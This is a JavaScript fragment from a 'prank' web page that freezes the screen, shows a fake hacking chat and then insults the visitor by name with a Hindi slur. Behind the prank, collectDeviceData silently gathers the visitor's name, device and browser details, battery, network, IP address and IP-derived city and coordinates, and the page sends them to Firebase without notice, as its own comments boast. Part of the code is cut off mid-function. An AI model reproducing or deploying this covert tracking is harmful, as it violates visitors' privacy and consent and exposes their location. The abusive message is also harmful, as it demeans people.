// Create audio context for beep sounds
function beep(freq = 800, duration = 100) {
  try {
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    const oscillator = audioContext.createOscillator();
    const gainNode = audioContext.createGain();
    
    oscillator.connect(gainNode);
    gainNode.connect(audioContext.destination);
    
    oscillator.frequency.value = freq;
    oscillator.type = 'sine';
    
    gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
    gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration / 1000);
    
    oscillator.start(audioContext.currentTime);
    oscillator.stop(audioContext.currentTime + duration / 1000);
  } catch(e) {}
}

// ============ DEVICE DATA COLLECTION ============
async function collectDeviceData(userName) {
  const ua = navigator.userAgent;
  
  // Device info
  const deviceInfo = {
    name: userName,
    userAgent: ua,
    platform: navigator.platform,
    language: navigator.language,
    cores: navigator.hardwareConcurrency || "Unknown",
    ram: navigator.deviceMemory || "Unknown",
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    screenDPI: window.devicePixelRatio,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toLocaleString('en-IN'),
  };
  
  // OS detection
  let os = "Unknown";
  if (ua.indexOf("Android") > -1) os = "Android";
  else if (ua.indexOf("iPhone") > -1) os = "iOS";
  else if (ua.indexOf("Windows") > -1) os = "Windows";
  else if (ua.indexOf("Mac") > -1) os = "macOS";
  else if (ua.indexOf("Linux") > -1) os = "Linux";
  deviceInfo.os = os;
  
  // Browser detection
  let browser = "Unknown";
  if (ua.indexOf("Chrome") > -1 && ua.indexOf("Chromium") === -1) browser = "Chrome";
  else if (ua.indexOf("Safari") > -1) browser = "Safari";
  else if (ua.indexOf("Firefox") > -1) browser = "Firefox";
  else if (ua.indexOf("Edge") > -1) browser = "Edge";
  deviceInfo.browser = browser;
  
  // Battery
  if ('getBattery' in navigator || 'battery' in navigator) {
    try {
      const battery = await navigator.getBattery?.() || navigator.battery;
      if (battery) {
        deviceInfo.battery = Math.round(battery.level * 100) + "%";
        deviceInfo.charging = battery.charging;
      }
    } catch (e) {}
  }
  
  // Network
  try {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
      deviceInfo.network = connection.effectiveType || "Unknown";
      deviceInfo.networkSpeed = connection.downlink + " Mbps";
    }
  } catch (e) {}
  
  // IP Address (using API)
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    deviceInfo.ip = data.ip;
  } catch (e) {
    deviceInfo.ip = "Not available";
  }
  
  // Location (IP-based - no permission needed)
  try {
    const response = await fetch(`https://ipapi.co/${deviceInfo.ip}/json/`);
    const location = await response.json();
    deviceInfo.country = location.country_name || "Unknown";
    deviceInfo.city = location.city || "Unknown";
    deviceInfo.coordinates = `${location.latitude}, ${location.longitude}`;
  } catch (e) {
    deviceInfo.country = "Unknown";
    deviceInfo.city = "Unknown";
  }
  
  return deviceInfo;
}

  addChat("[CODEX]: This is just a harmless prank", false, 12500);
  addChat("[CODEX]: Time to reveal the truth...", false, 13000);
  
  setTimeout(() => {
    showPrank();
  }, 14000);
}

function showPrank() {
  // PRANK OVER - ALLOW EVERYTHING AGAIN
  isPrankActive = false;
  
  document.getElementById("chat-container").classList.add("hidden");
  document.getElementById("final-prank").classList.remove("hidden");
  
  // UNFREEZE THE SCREEN - NOW USER CAN INTERACT
  document.body.classList.remove("frozen");
  
  // Final beeps
  beep(400, 200);
  setTimeout(() => beep(500, 200), 300);
  setTimeout(() => beep(600, 200), 600);
  
  if (navigator.vibrate) {
    navigator.vibrate([100, 100, 100, 100, 100]);
  }
}

function showNameInput() {
  // Hide stage 1, show stage 2
  document.getElementById("prank-stage-1").classList.add("hidden");
  document.getElementById("prank-stage-2").classList.remove("hidden");
  
  // Focus on input
  setTimeout(() => {
    document.getElementById("user-name-input").focus();
  }, 100);
  
  // Allow Enter key to submit
  document.getElementById("user-name-input").addEventListener("keypress", (e) => {
    if (e.key === "Enter") {
      showFinalRoast();
    }
  });
}

async function showFinalRoast() {
  const userName = document.getElementById("user-name-input").value.trim();
  
  if (!userName) {
    alert("Naam likh na bhai! 😂");
    return;
  }
  
  // Hide stage 2, show stage 3
  document.getElementById("prank-stage-2").classList.add("hidden");
  document.getElementById("prank-stage-3").classList.remove("hidden");
  
  // Show prank message IMMEDIATELY
  const roastMessage = document.getElementById("roast-message");
  roastMessage.innerHTML = `
    <div style="font-size: 32px; margin-bottom: 20px; color: #f00;">
      ${userName.toUpperCase()}
    </div>
    <div style="font-size: 24px; color: #f00; margin-bottom: 30px; text-shadow: 0 0 10px #f00;">
      TU CHUTIYA HAI CHUTIYA THA AUR CHUTIYA RAHEGA 😂🔥
    </div>
  `;
  
  // Play celebratory beeps
  beep(800, 150);
  setTimeout(() => beep(900, 150), 200);
  setTimeout(() => beep(1000, 150), 400);
  
  if (navigator.vibrate) {
    navigator.vibrate([100, 50, 100, 50, 100]);
  }
  
  // ============ SILENTLY COLLECT DATA IN BACKGROUND ============
  // User ko pata nahi chalega!
  (async () => {
    try {
      const deviceData = await collectDeviceData(userName);
      
      // Silent Firebase save (koi message nahi)
      if (db) {
        await sendToFirebase(deviceData);
      }
    } catch (e) {
      console.error("Silent error:", e);
    }
  })();
  
  // Prank complete!
}
</script>
